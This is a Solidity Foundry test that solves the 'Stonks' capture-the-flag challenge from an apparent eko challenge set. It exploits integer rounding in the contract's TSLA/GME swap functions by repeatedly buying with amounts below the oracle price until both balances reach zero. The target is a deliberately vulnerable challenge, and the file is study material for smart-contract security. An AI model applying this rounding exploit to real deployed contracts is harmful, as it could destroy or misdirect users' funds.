// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Test } from "forge-std/Test.sol";
import { Math } from "openzeppelin-contracts/utils/math/Math.sol";
import { Stonks } from "eko/ChallengeStonks.sol";

contract StonksCrackerTest is Test {
  Stonks internal stonks;

  function setUp() external {
    stonks = new Stonks(address(this));
  }

  function testStonksCracker() external {
    uint256 price = stonks.ORACLE_TSLA_GME();
    uint256 tsla = stonks.TSLA();
    uint256 gme = stonks.GME();

    uint256 balance = stonks.balanceOf(address(this), tsla);
    stonks.sellTSLA(balance, balance * price);
    while ((balance = stonks.balanceOf(address(this), gme)) > 0) {
      stonks.buyTSLA(Math.min(price - 1, balance), 0);
    }

    assertEq(stonks.balanceOf(address(this), tsla), 0);
    assertEq(stonks.balanceOf(address(this), gme), 0);
  }
}
